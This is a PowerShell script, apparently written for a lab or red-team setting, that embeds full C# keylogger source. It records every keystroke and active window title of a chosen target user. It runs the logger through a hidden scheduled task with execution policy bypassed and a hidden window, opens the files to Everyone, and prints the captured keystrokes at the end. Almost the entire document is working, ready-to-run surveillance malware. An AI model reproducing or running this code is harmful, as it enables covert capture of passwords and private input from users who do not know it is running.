# schtask-keylogger.ps1
# Usage : .\schtask-keylogger.ps1 -TargetUser "LAB\victime" [-OutputDir "C:\Lab"] [-Duration 120]

param(
    [Parameter(Mandatory)][string]$TargetUser,
    [string]$OutputDir = "C:\Lab",
    [string]$TaskName = "MaTaskKeylog",
    [int]$Duration = 120
)

$base = "$OutputDir\keylog"

Write-Host "[*] Creating working directory and setting ACL..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
icacls $OutputDir /grant "Everyone:(OI)(CI)F" | Out-Null

Write-Host "[*] Cleaning up previous files..." -ForegroundColor Cyan
Remove-Item -Path "$base.ps1","$base.log","$OutputDir\keylog-type.cs","$OutputDir\compile-error.log" -Force -ErrorAction SilentlyContinue
New-Item -Path "$base.log" -ItemType File -Force | Out-Null
icacls "$base.log" /grant "Everyone:(F)" | Out-Null

Write-Host "[*] Creating C# type file..." -ForegroundColor Cyan
$csharp = @'
using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;

public class KeylogTimer {

    public delegate void WinEventDelegate(
        IntPtr hWinEventHook, uint eventType,
        IntPtr hwnd, int idObject, int idChild,
        uint dwEventThread, uint dwmsEventTime
    );

    [DllImport("user32.dll")] public static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
    [DllImport("user32.dll")] public static extern bool UnhookWinEvent(IntPtr hWinEventHook);
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("user32.dll")] public static extern bool PeekMessage(ref MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax, uint wRemoveMsg);
    [DllImport("user32.dll")] public static extern bool TranslateMessage(ref MSG lpMsg);
    [DllImport("user32.dll")] public static extern IntPtr DispatchMessage(ref MSG lpMsg);

    [StructLayout(LayoutKind.Sequential)]
    public struct MSG {
        public IntPtr hwnd;
        public uint message;
        public IntPtr wParam;
        public IntPtr lParam;
        public uint time;
        public int ptX;
        public int ptY;
    }

    const uint EVENT_SYSTEM_FOREGROUND = 0x0003;
    const uint EVENT_OBJECT_FOCUS      = 0x8005;
    const uint WINEVENT_OUTOFCONTEXT   = 0x0000;
    const uint PM_REMOVE               = 0x0001;

    static string outputPath;
    static string lastWindow = "";
    static WinEventDelegate winEventDelegateRef;

    static string GetActiveWindowTitle() {
        StringBuilder sb = new StringBuilder(256);
        GetWindowText(GetForegroundWindow(), sb, 256);
        return sb.ToString();
    }

    static void CheckWindowChange() {
        string currentWindow = GetActiveWindowTitle();
        if (currentWindow != lastWindow && currentWindow != "") {
            File.AppendAllText(outputPath,
                "\r\n[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") +
                "] [Window: " + currentWindow + "]\r\n");
            lastWindow = currentWindow;
        }
    }

    static string GetKeyStr(int key) {
        bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
        bool caps  = Console.CapsLock;

        if (key >= 65 && key <= 90) return (shift ^ caps) ? ((char)key).ToString() : ((char)(key + 32)).ToString();
        if (key >= 48 && key <= 57) { string[] s = {")", "!", "@", "#", "$", "%", "^", "&", "*", "("}; return shift ? s[key - 48] : ((char)key).ToString(); }
        if (key >= 96 && key <= 105) return ((char)(key - 48)).ToString();

        switch (key) {
            case 32:  return " ";
            case 13:  return "\r\n[ENTER]\r\n";
            case 8:   return "[BACK]";
            case 9:   return "[TAB]";
            case 46:  return "[DEL]";
            case 27:  return "[ESC]";
            case 37:  return "[LEFT]";
            case 39:  return "[RIGHT]";
            case 38:  return "[UP]";
            case 40:  return "[DOWN]";
            case 190: return shift ? ">" : ".";
            case 188: return shift ? "<" : ",";
            case 189: return shift ? "_" : "-";
            case 187: return shift ? "+" : "=";
            case 191: return shift ? "?" : "/";
            case 186: return shift ? ":" : ";";
            case 222: return shift ? "\"" : "'";
            case 219: return shift ? "{" : "[";
            case 221: return shift ? "}" : "]";
            case 220: return shift ? "|" : "\\";
            case 192: return shift ? "~" : "`";
            default:  return "";
        }
    }

    static void FocusCallback(IntPtr hook, uint eventType, IntPtr hwnd,
        int idObject, int idChild, uint thread, uint time) {
        CheckWindowChange();
    }

    public static void Run(string path, int durationSeconds) {
        outputPath = path;
        DateTime endTime = DateTime.Now.AddSeconds(durationSeconds);

        File.AppendAllText(outputPath,
            "[Keylogger started at " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "]\r\n");

        winEventDelegateRef = new WinEventDelegate(FocusCallback);
        IntPtr winEventHook = SetWinEventHook(
            EVENT_SYSTEM_FOREGROUND, EVENT_OBJECT_FOCUS,
            IntPtr.Zero, winEventDelegateRef, 0, 0, WINEVENT_OUTOFCONTEXT
        );

        MSG msg = new MSG();
        while (DateTime.Now < endTime) {
            while (PeekMessage(ref msg, IntPtr.Zero, 0, 0, PM_REMOVE)) {
                TranslateMessage(ref msg);
                DispatchMessage(ref msg);
            }

            CheckWindowChange();

            StringBuilder keys = new StringBuilder();
            for (int i = 8; i <= 255; i++) {
                if ((GetAsyncKeyState(i) & 0x0001) != 0) {
                    string k = GetKeyStr(i);
                    if (k != "") keys.Append(k);
                }
            }

            if (keys.Length > 0) File.AppendAllText(outputPath, keys.ToString());

            Thread.Sleep(50);
        }

        File.AppendAllText(outputPath,
            "\r\n[Keylogger stopped at " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "]\r\n");

        UnhookWinEvent(winEventHook);
    }
}
'@
Set-Content -Path "$OutputDir\keylog-type.cs" -Value $csharp -Encoding ASCII
icacls "$OutputDir\keylog-type.cs" /grant "Everyone:(F)" | Out-Null

Write-Host "[*] Creating PS1 payload script..." -ForegroundColor Cyan
$ps1 = @"
`$cs = Get-Content "$OutputDir\keylog-type.cs" -Raw
Add-Type -TypeDefinition `$cs 2>&1 | Out-File "$OutputDir\compile-error.log"
[KeylogTimer]::Run("$base.log", $Duration)
"@
Set-Content -Path "$base.ps1" -Value $ps1 -Encoding ASCII
icacls "$base.ps1" /grant "Everyone:(F)" | Out-Null

# Creation et lancement de la tache planifiee (fenetre cachee + tache cachee)
Write-Host "[*] Creating and starting scheduled task as $TargetUser (hidden)..." -ForegroundColor Cyan
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $base.ps1" -WorkingDirectory $OutputDir
$principal = New-ScheduledTaskPrincipal -UserId $TargetUser -LogonType Interactive -RunLevel Limited
$settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes ($Duration / 60 + 5))
Register-ScheduledTask -TaskName $TaskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null
Start-ScheduledTask -TaskName $TaskName

Write-Host "[*] Keylogger running for ${Duration}s in context of $TargetUser (window hidden, task hidden)..." -ForegroundColor Cyan
Write-Host "[*] Output : $base.log" -ForegroundColor Cyan

# Attente de la fin
$elapsed = 0
$totalWait = $Duration + 15
while ($elapsed -lt $totalWait) {
    Start-Sleep -Seconds 5
    $elapsed += 5
    $result = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
    if ($result -ne 267009) { break }
    Write-Host "[*] Still running... ($elapsed / ${totalWait}s)" -ForegroundColor Cyan
}

# Resultat
$result = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
if ($result -eq 0) {
    Write-Host "[+] Keylogger completed successfully !" -ForegroundColor Green
    $content = Get-Content "$base.log" -ErrorAction SilentlyContinue
    if ($content) {
        Write-Host "[+] Captured output :" -ForegroundColor Green
        Write-Host $content -ForegroundColor White
    } else {
        Write-Host "[-] Log file is empty (no keystrokes captured)" -ForegroundColor Yellow
        Get-Content "$OutputDir\compile-error.log" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }
    }
} else {
    Write-Host "[-] Failed (LastTaskResult: $result)" -ForegroundColor Red
    Get-Content "$OutputDir\compile-error.log" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }
}

# Nettoyage
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
Write-Host "[*] Scheduled task deleted." -ForegroundColor Cyan
